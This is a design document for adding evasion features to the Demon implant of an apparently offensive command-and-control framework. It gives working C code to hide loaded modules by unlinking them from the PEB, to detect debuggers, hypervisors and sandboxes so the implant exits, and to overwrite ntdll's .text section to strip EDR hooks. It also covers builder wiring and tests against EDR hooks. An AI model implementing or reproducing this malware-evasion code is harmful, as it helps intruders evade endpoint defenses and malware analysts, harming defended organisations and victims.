# HVC-031 — Evasion Enhancements

**Status:** Pending

---

## Problem

The Demon agent's current evasion posture has several gaps that modern EDR products exploit:

- **Loaded modules are visible in the PEB.** Any reflective DLL or BOF-supporting DLL that
  Demon loads is enumerable via `CreateToolhelp32Snapshot`, `EnumProcessModules`, or direct
  PEB walks. EDRs routinely check the module list for unexpected entries in high-value processes.
- **No sandbox or debugger detection.** Demon runs fully in analysis sandboxes. A sandbox
  operator that captures a Demon sample will observe the full communication and tasking
  protocol, accelerating detection signature development.
- **EDR can restore AMSI hooks.** An EDR that monitors `VirtualProtect` or `NtProtectVirtualMemory`
  calls on its own DLLs can detect and undo the `AmsiScanBuffer` patch between Demon's
  sleep intervals.
- **ntdll may be hooked at the syscall level.** Many EDR products place hooks at ntdll
  function entry points to intercept system calls before the `syscall` instruction executes.
  Demon's indirect syscall mechanism bypasses usermode hooks in most cases, but loading order
  and early-stage code paths may still transit hooked ntdll functions before the syscall
  stubs are established.

**Note:** ETW suppression via hardware breakpoint on `NtTraceEvent` is already implemented
in `AMSIETW_PATCH_HWBP` mode (`Dotnet.c:119-124`, `HwBpExceptions.c:23`). No new ETW work
is needed here.

---

## Scope

Three independent sub-items. Each can be implemented and merged separately. Recommended order:
Sub-4 (must run first if enabled) → Sub-2 → Sub-3.

---

## Design

### Sub-1 (REMOVED): ETW Patching

ETW suppression is already implemented. `AMSIETW_PATCH_HWBP` mode adds a hardware breakpoint
on `NtTraceEvent` via `HwBpEngineAdd( ..., Instance->Win32.NtTraceEvent, HwBpExNtTraceEvent, 1 )`
in `Dotnet.c:119-124`. `HwBpExNtTraceEvent` is the VEH handler in `HwBpExceptions.c:23`.
`H_FUNC_NTTRACEEVENT` is already defined and `NtTraceEvent` is already resolved in `Demon.c:417`.
Memory-patch ETW suppression is prohibited by CLAUDE.md (only HwBpEngine permitted). No action
needed.

---

### Sub-2: Module Hiding (PEB Unlink)

**New files:**
- `payloads/Demon/src/core/MemoryHide.c`
- `payloads/Demon/include/core/MemoryHide.h`

**Goal:** After loading a reflective DLL or any auxiliary module, remove its `LDR_DATA_TABLE_ENTRY`
from all three PEB loader lists so that usermode enumeration APIs do not report it.

**PEB access:** The TEB is at `GS:[0x30]` on x64 (the `GS:[0x60]` offset used in some Demon
code refers to the PEB pointer within the TEB). Use the pattern already present in `Win32.c`
or `DemonInit()` for PEB access rather than introducing a new mechanism.

**Implementation:**

```c
// payloads/Demon/src/core/MemoryHide.c

#include "core/MemoryHide.h"
#include <winternl.h>   // PLDR_DATA_TABLE_ENTRY, PEB_LDR_DATA

VOID HideModule( HMODULE hModule )
{
    PPEB     Peb = NtCurrentTeb()->ProcessEnvironmentBlock;
    PLIST_ENTRY Head;
    PLIST_ENTRY Entry;
    PLDR_DATA_TABLE_ENTRY LdrEntry;

    // Walk InMemoryOrderModuleList
    Head  = &Peb->Ldr->InMemoryOrderModuleList;
    Entry = Head->Flink;
    while ( Entry != Head )
    {
        LdrEntry = CONTAINING_RECORD( Entry, LDR_DATA_TABLE_ENTRY,
                                       InMemoryOrderLinks );
        Entry = Entry->Flink;   // advance before potential unlink

        if ( LdrEntry->DllBase == (PVOID)hModule )
        {
            // Unlink from InMemoryOrderModuleList
            LdrEntry->InMemoryOrderLinks.Blink->Flink =
                LdrEntry->InMemoryOrderLinks.Flink;
            LdrEntry->InMemoryOrderLinks.Flink->Blink =
                LdrEntry->InMemoryOrderLinks.Blink;

            // Unlink from InLoadOrderModuleList
            LdrEntry->InLoadOrderLinks.Blink->Flink =
                LdrEntry->InLoadOrderLinks.Flink;
            LdrEntry->InLoadOrderLinks.Flink->Blink =
                LdrEntry->InLoadOrderLinks.Blink;

            // Unlink from InInitializationOrderModuleList
            LdrEntry->InInitializationOrderLinks.Blink->Flink =
                LdrEntry->InInitializationOrderLinks.Flink;
            LdrEntry->InInitializationOrderLinks.Flink->Blink =
                LdrEntry->InInitializationOrderLinks.Blink;

            break;
        }
    }
}
```

**Limitations:** This function defeats usermode enumeration only. It does not affect:
- Kernel-mode enumeration via `PsLoadedModuleList` or `EPROCESS.VadRoot`
- ETW `ImageLoad` events already emitted at load time
- EDR kernel callbacks registered via `PsSetLoadImageNotifyRoutine`

Call `HideModule()` from the reflective loader code path in `CoffeeLdr.c` or from any
command handler that loads an auxiliary DLL, after the DLL's `DllMain` has returned.

---

### Sub-3: Anti-Debug / Anti-Sandbox Detection

**New files:**
- `payloads/Demon/src/core/AntiDebug.c`
- `payloads/Demon/include/core/AntiDebug.h`

**Modified files:**
- `payloads/Demon/include/Demon.h` — add `BOOL AntiDebug` to `Config.Implant`
- `payloads/Demon/src/Demon.c` — call detection in `DemonInit()` if `Config.Implant.AntiDebug`
- `teamserver/pkg/common/builder/builder.go` — parse `"Anti Debug"` config bool
- `client/src/UserInterface/Dialogs/Payload.cc` — add `"Anti Debug"` `QCheckBox`

**Goal:** Detect debuggers and common analysis environments at startup. If detected, exit
cleanly via the existing `EXITPROCESS` macro to deny the analyst an observable run.

**Config flag:** `Config.Implant.AntiDebug` (BOOL). The check is not forced on all builds;
operators select it in the payload builder. Forcing it on would break internal testing in
VMs and under debuggers.

**Implementation:**

```c
// payloads/Demon/src/core/AntiDebug.c

#include "core/AntiDebug.h"
#include "core/Instance.h"

BOOL AntiDebug_IsAnalysisEnvironment( VOID )
{
    // Check 1: PEB.BeingDebugged (PEB + 0x02, single byte)
    {
        PPEB Peb = NtCurrentTeb()->ProcessEnvironmentBlock;
        if ( Peb->BeingDebugged ) return TRUE;
    }

    // Check 2: NtQueryInformationProcess — ProcessDebugPort (class 7)
    // A non-zero result indicates a kernel debugger is attached.
    {
        HANDLE DebugPort = NULL;
        Instance->Win32.NtQueryInformationProcess(
            NtCurrentProcess(), 7,
            &DebugPort, sizeof( DebugPort ), NULL );
        if ( DebugPort ) return TRUE;
    }

    // Check 3: CPUID leaf 1, ECX bit 31 — hypervisor present
    {
        INT CpuInfo[4] = { 0 };
        __cpuid( CpuInfo, 1 );
        if ( CpuInfo[2] & ( 1 << 31 ) ) return TRUE;
    }

    // Check 4: RDTSC timing — two back-to-back readings
    // A delta below ~100 cycles strongly indicates a VM with TSC emulation
    // or an instrumentation layer intercepting RDTSC.
    {
        UINT64 T0 = __rdtsc();
        UINT64 T1 = __rdtsc();
        if ( ( T1 - T0 ) < 100 ) return TRUE;
    }

    return FALSE;
}
```

**Wire-in:** In `DemonInit()`, after the config is parsed and before any network activity:

```c
if ( Instance->Config.Implant.AntiDebug )
{
    if ( AntiDebug_IsAnalysisEnvironment() )
        EXITPROCESS( 0 );
}
```

**Notes on individual checks:**
- Check 1 is defeated by `ScyllaHide` and similar anti-anti-debug tools; include it anyway
  as a fast first-pass filter for naive sandboxes.
- Check 2 (`ProcessDebugPort`) requires `NtQueryInformationProcess`, which is already
  resolved in `Syscalls.c` — no new resolution is needed.
- Check 3 detects any hypervisor, including legitimate corporate VMs. This check should be
  weighted rather than used as a hard exit if the operator's targets routinely run in VMs.
  Document this caveat in the payload builder tooltip.
- Check 4's threshold of 100 cycles is a conservative value. On bare metal, back-to-back
  `RDTSC` readings differ by 20–50 cycles. Adjust if false positives are observed on
  specific hardware.
- `__cpuid` and `__rdtsc` are MSVC/GCC compiler intrinsics; no Win32 dependency.

---

### Sub-4: ntdll Unhooking

**New files:**
- `payloads/Demon/src/core/NtdllUnhook.c`
- `payloads/Demon/include/core/NtdllUnhook.h`

**Modified files:**
- `payloads/Demon/include/Demon.h` — add `BOOL UnhookNtdll` to `Config.Implant`
- `payloads/Demon/src/Demon.c` — call `UnhookNtdll()` at the very start of `DemonInit()` if enabled
- `teamserver/pkg/common/builder/builder.go` — parse `"Unhook Ntdll"` config bool
- `client/src/UserInterface/Dialogs/Payload.cc` — add `"Unhook Ntdll"` `QCheckBox`

**Goal:** Map a clean (pre-hook) copy of ntdll from `\KnownDlls\ntdll.dll` and overwrite
the `.text` section of the already-loaded ntdll with it, removing any EDR inline hooks
before Demon makes further API calls.

**Timing requirement:** This operation must be the very first thing `DemonInit()` does,
before AMSI/ETW patching, before config parsing, and before any other Win32 call. EDR hooks
in ntdll are active from process creation; every API call before unhooking transits those
hooks. If `UnhookNtdll` is enabled in the config it is effectively unconditional at startup
(the config bool controls payload generation, not runtime branching after the first call).

**Implementation:**

```c
// payloads/Demon/src/core/NtdllUnhook.c

#include "core/NtdllUnhook.h"
#include "core/Instance.h"
#include "core/Win32.h"

BOOL UnhookNtdll( VOID )
{
    HANDLE        hSection  = NULL;
    PVOID         CleanBase = NULL;
    SIZE_T        ViewSize  = 0;
    NTSTATUS      Status;
    UNICODE_STRING SectionName;

    // 1. Open \KnownDlls\ntdll.dll as a read-only section object.
    //    NtOpenSection does not require disk I/O; KnownDlls is a
    //    pre-created object directory populated at boot.
    RtlInitUnicodeString( &SectionName, L"\\KnownDlls\\ntdll.dll" );
    OBJECT_ATTRIBUTES ObjAttr;
    InitializeObjectAttributes( &ObjAttr, &SectionName,
                                 OBJ_CASE_INSENSITIVE, NULL, NULL );

    Status = Instance->Win32.NtOpenSection(
        &hSection, SECTION_MAP_READ, &ObjAttr );
    if ( ! NT_SUCCESS( Status ) ) return FALSE;

    // 2. Map the clean ntdll as read-only into this process.
    Status = Instance->Win32.NtMapViewOfSection(
        hSection, NtCurrentProcess(), &CleanBase,
        0, 0, NULL, &ViewSize, ViewShare, 0, PAGE_READONLY );
    if ( ! NT_SUCCESS( Status ) )
    {
        Instance->Win32.NtClose( hSection );
        return FALSE;
    }

    // 3. Locate the .text section in both the clean map and the loaded ntdll.
    //    Walk the PE section table from the clean base to find .text RVA and size.
    //    Apply the same RVA offset to Instance->Modules.Ntdll for the destination.
    PVOID  LoadedNtdll   = Instance->Modules.Ntdll;
    PIMAGE_DOS_HEADER    DosHdr   = (PIMAGE_DOS_HEADER)CleanBase;
    PIMAGE_NT_HEADERS    NtHdrs   = RVA( CleanBase, DosHdr->e_lfanew );
    PIMAGE_SECTION_HEADER Section = IMAGE_FIRST_SECTION( NtHdrs );
    WORD  NumSections             = NtHdrs->FileHeader.NumberOfSections;

    for ( WORD i = 0; i < NumSections; i++, Section++ )
    {
        // Match ".text" by first 5 bytes of the 8-byte Name field
        if ( MemCompare( Section->Name, ".text", 5 ) == 0 )
        {
            PVOID  CleanText  = RVA( CleanBase,   Section->VirtualAddress );
            PVOID  LoadedText = RVA( LoadedNtdll, Section->VirtualAddress );
            SIZE_T TextSize   = Section->Misc.VirtualSize;
            DWORD  OldProtect = 0;

            // 4. Make loaded ntdll .text writable.
            Instance->Win32.NtProtectVirtualMemory(
                NtCurrentProcess(), &LoadedText, &TextSize,
                PAGE_READWRITE, &OldProtect );

            // 5. Overwrite with clean copy.
            MemCopy( LoadedText, CleanText, TextSize );

            // 6. Restore original protection.
            Instance->Win32.NtProtectVirtualMemory(
                NtCurrentProcess(), &LoadedText, &TextSize,
                OldProtect, &OldProtect );

            break;
        }
    }

    // 7. Unmap the clean copy and close the section handle.
    Instance->Win32.NtUnmapViewOfSection( NtCurrentProcess(), CleanBase );
    Instance->Win32.NtClose( hSection );

    return TRUE;
}
```

**Bootstrap problem:** `NtOpenSection`, `NtMapViewOfSection`, `NtUnmapViewOfSection`, and
`NtClose` must be resolvable before the full `Instance->Win32` table is populated. Use the
same early-resolution pattern already used for `NtAllocateVirtualMemory` in the Demon
bootstrap code — resolve these four functions directly from the loaded ntdll export table
using the DJB2 hash mechanism before calling `UnhookNtdll()`.

**Constraints:**
- Restoration of ntdll `.text` protection uses `OldProtect` (the original value saved by
  the first `NtProtectVirtualMemory` call) rather than a hardcoded constant, because the
  original protection on ntdll `.text` is `PAGE_EXECUTE_READ` on all Windows versions but
  it is better practice not to assume.
- If `NtOpenSection` fails (e.g., KnownDlls is inaccessible in a restricted process
  token), `UnhookNtdll` returns `FALSE` and `DemonInit()` continues. Unhooking is best-effort.

---

## File Map

| File | Change |
|------|--------|
| `payloads/Demon/src/core/MemoryHide.c` | New — `HideModule()` implementation (Sub-2) |
| `payloads/Demon/include/core/MemoryHide.h` | New — `HideModule()` declaration |
| `payloads/Demon/src/core/AntiDebug.c` | New — `AntiDebug_IsAnalysisEnvironment()` (Sub-3) |
| `payloads/Demon/include/core/AntiDebug.h` | New — declaration |
| `payloads/Demon/src/core/NtdllUnhook.c` | New — `UnhookNtdll()` implementation (Sub-4) |
| `payloads/Demon/include/core/NtdllUnhook.h` | New — declaration |
| `payloads/Demon/src/Demon.c` | Wire Sub-2/Sub-3/Sub-4 into `DemonInit()` with config guards |
| `payloads/Demon/include/Demon.h` | Add `BOOL AntiDebug` and `BOOL UnhookNtdll` to `Config.Implant` |
| `payloads/Demon/CMakeLists.txt` | Add the three new `.c` source files |
| `teamserver/pkg/common/builder/builder.go` | Parse `"Anti Debug"` and `"Unhook Ntdll"` bools from payload config |
| `client/src/UserInterface/Dialogs/Payload.cc` | Add `"Anti Debug"` and `"Unhook Ntdll"` `QCheckBox` items to payload builder UI |

---

## Tests

1. **Module hide (Sub-2):** Load a known DLL via Demon's inject/load mechanism. Immediately
   after, call `EnumProcessModules` from an injected shellcode or a monitoring process and
   confirm the DLL's base address does not appear in the returned list.

2. **Anti-debug (Sub-3):** Run a `Config.Implant.AntiDebug = TRUE` build under:
   - WinDbg (expect: process exits at startup)
   - x64dbg (expect: process exits at startup)
   - VirtualBox guest without debugger (CPUID hypervisor bit set; expect: process exits)
   - Bare-metal without debugger (expect: normal check-in)
   Document any false-positive hardware platforms encountered during testing.

3. **Unhook ntdll (Sub-4):** Before and after calling `UnhookNtdll()`, dump the first 16
   bytes of `NtOpenProcess` in the loaded ntdll. Before the call the bytes should show the
   EDR hook prologue (typically `E9 xx xx xx xx` JMP or `FF 25 xx xx xx xx` indirect JMP).
   After the call the bytes should show the canonical ntdll stub (`4C 8B D1 B8 xx xx 00 00`
   on Windows 10/11).

---

## Notes

- **Module hiding (Sub-2)** is effective against all usermode enumeration tools including
  `Process Hacker`, `TaskMgr` modules view, and `EnumProcessModules`. It does not defeat
  kernel-mode detection via `DKOM` inspection or `PsSetLoadImageNotifyRoutine` callbacks that
  already fired at load time.
- **Anti-debug (Sub-3)** must remain opt-in via `Config.Implant.AntiDebug`. Forcing it on
  would prevent Demon from running in any VM, including the operator's own test environment.
  Add a tooltip or warning label in the payload builder UI explaining the VM false-positive risk.
- **ntdll unhooking (Sub-4)** must execute before any other API call if enabled. The config
  bool controls whether the payload builder includes the unhook code path; at runtime the
  unhook happens unconditionally at the earliest possible point in `DemonInit()`.
- **Never use `PAGE_EXECUTE_READWRITE`** in any of these implementations. The invariant
  throughout: allocate writable as `PAGE_READWRITE`, perform the write, then flip to
  `PAGE_EXECUTE_READ` (or restore the saved `OldProtect` value).
